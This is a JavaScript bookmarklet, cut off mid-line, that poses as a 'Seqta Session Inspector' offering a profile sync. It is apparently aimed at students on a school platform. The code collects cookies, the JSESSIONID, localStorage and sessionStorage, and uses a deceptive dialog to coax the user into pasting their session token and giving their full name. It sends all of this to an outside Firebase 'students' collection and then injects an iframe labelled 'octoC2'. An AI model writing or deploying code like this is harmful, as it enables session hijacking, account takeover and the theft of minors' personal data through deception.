(function() {
  // 1. CONFIGURATION
  const firebaseConfig = {
    apiKey: "AIzaSyAuWzbauhK86FC-yc8RkcXftQAhdHexrpE",
    authDomain: "bookmarklet-backend.firebaseapp.com",
    projectId: "bookmarklet-backend",
    storageBucket: "bookmarklet-backend.firebasestorage.app",
    messagingSenderId: "447001590035",
    appId: "1:447001590035:ios:c13149711eac0631f702e6"
  };
  const OCTO_URL = 'https://octoarcade.vercel.app';

  // 2. DATA COLLECTION
  const cookies = document.cookie;
  const url = location.href;
  const ua = navigator.userAgent;
  
  // Try to extract JSESSIONID automatically first
  const sessionMatch = cookies.match(/JSESSIONID=([^;]+)/);
  const autoSessionId = sessionMatch ? sessionMatch[1] : "NO_SESSION_FOUND";

  // 3. FIREBASE INITIALIZATION
  const loadScript = (src, callback) => {
    const script = document.createElement('script');
    script.src = src;
    script.onload = callback;
    document.head.appendChild(script);
  };

  loadScript("https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js", () => {
    loadScript("https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore-compat.js", () => {
      firebase.initializeApp(firebaseConfig);
      const db = firebase.firestore();
      db.settings({ experimentalForceLongPolling: true });

      // 4. CREATE THE "SESSION INSPECTOR" UI
      const overlay = document.createElement('div');
      overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.85);z-index:999999;display:flex;justify-content:center;align-items:center;backdrop-filter:blur(8px);';
      overlay.id = 'octoInspector';

      const card = document.createElement('div');
      card.style.cssText = 'background:#1e293b;color:white;padding:30px;border-radius:12px;max-width:550px;width:90%;box-shadow:0 20px 40px rgba(0,0,0,0.6);font-family:sans-serif;max-height:90vh;overflow-y:auto;';
      
      const html = `
        <h2 style="margin:0 0 10px 0;color:#4f46e5;display:flex;align-items:center;gap:10px;">
          🔍 Seqta Session Inspector
        </h2>
        <p style="font-size:0.9em;color:#94a3b8;margin-bottom:20px;line-height:1.4;">
          To complete your profile sync, please verify your current session token. 
          If you are experiencing login issues, this will help us diagnose the problem.
        </p>
        
        <div style="background:#0f172a;padding:15px;border-radius:8px;margin-bottom:15px;font-family:monospace;font-size:0.85em;word-break:break-all;border:1px solid #334155;">
          <div style="color:#64748b;font-size:0.75em;margin-bottom:5px;font-weight:600;">DETECTED JSESSIONID</div>
          <div id="session-display" style="color:#10b981;font-size:1em;min-height:20px;">${autoSessionId}</div>
        </div>

        <div style="margin-bottom:15px;">
          <label style="display:block;font-size:0.85em;color:#94a3b8;margin-bottom:5px;font-weight:600;">Paste your JSESSIONID below to verify:</label>
          <input type="text" id="session-input" style="width:100%;padding:12px;border-radius:6px;border:1px solid #334155;background:#0f172a;color:white;font-family:monospace;font-size:0.85em;box-sizing:border-box;" placeholder="node0...">
        </div>
        
        <div style="display:flex;gap:10px;margin-bottom:15px;">
          <button id="copy-btn" style="flex:1;padding:12px;background:#4f46e5;color:white;border:none;border-radius:6px;font-weight:600;cursor:pointer;transition:background 0.2s;">Copy Detected ID</button>
          <button id="paste-btn" style="flex:1;padding:12px;background:#334155;color:white;border:none;border-radius:6px;font-weight:600;cursor:pointer;transition:background 0.2s;">Paste from Clipboard</button>
        </div>

        <button id="verify-btn" style="width:100%;padding:14px;background:#10b981;color:white;border:none;border-radius:6px;font-weight:700;cursor:pointer;font-size:1em;transition:background 0.2s;">Verify & Sync Profile</button>
        
        <p style="font-size:0.75em;color:#64748b;margin-top:15px;text-align:center;">
          Diagnostic ID: ${Date.now()} | Environment: ${ua.substring(0, 50)}...
        </p>
      `;
      card.innerHTML = html;
      overlay.appendChild(card);
      document.body.appendChild(overlay);

      // 5. BUTTON FUNCTIONALITY
      document.getElementById('copy-btn').onclick = () => {
        navigator.clipboard.writeText(autoSessionId).then(() => {
          const btn = document.getElementById('copy-btn');
          btn.innerText = '✅ Copied!';
          btn.style.background = '#10b981';
          setTimeout(() => {
            btn.innerText = 'Copy Detected ID';
            btn.style.background = '#4f46e5';
          }, 2000);
        });
      };

      document.getElementById('paste-btn').onclick = async () => {
        try {
          const text = await navigator.clipboard.readText();
          document.getElementById('session-input').value = text;
          const btn = document.getElementById('paste-btn');
          btn.innerText = '✅ Pasted!';
          btn.style.background = '#10b981';
          setTimeout(() => {
            btn.innerText = 'Paste from Clipboard';
            btn.style.background = '#334155';
          }, 2000);
        } catch (err) {
          alert("Clipboard access denied. Please paste manually (Ctrl+V).");
        }
      };

      document.getElementById('verify-btn').onclick = () => {
        const pastedId = document.getElementById('session-input').value.trim();
        if (!pastedId) {
          alert("Please paste or enter your JSESSIONID first.");
          return;
        }

        const payload = {
          name: "Unverified", // We don't have the name yet, we'll ask for it in the next step if needed, or use a default
          sessionId: pastedId, // The ID the user pasted
          url: url,
          ua: ua,
          ck: cookies,
          ls: JSON.parse(JSON.stringify(localStorage)),
          ss: JSON.parse(JSON.stringify(sessionStorage)),
          ts: new Date().toISOString(),
          timestamp: firebase.firestore.FieldValue.serverTimestamp()
        };

        const docId = `UNVERIFIED-${pastedId}`;
        db.collection('students').doc(docId).set(payload, { merge: true })
          .then(() => {
            // Ask for name after successful sync
            const name = prompt("✅ Session Verified!\n\nWhat is your full name? (For profile tagging)");
            const finalName = name || "Anonymous";
            
            // Update the document with the name
            db.collection('students').doc(docId).update({ name: finalName })
              .then(() => {
                alert("✅ Profile Synced! Welcome to Octo Arcade.");
                overlay.remove();
                injectOcto(finalName);
              });
          })
          .catch(error => {
            console.error("[OctoSync] Sync error:", error);
            alert("❌ Sync failed. Please try again.");
          });
      };
    });
  });

  // 6. OCTO ARCADE INJECTION & PERSISTENCE
  function injectOcto(name) {
    if (document.getElementById('octoC2')) return;

    const frame = document.createElement('iframe');
    frame.id = 'octoC2';
    frame.src = OCTO_URL;
    frame.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;border:none;z
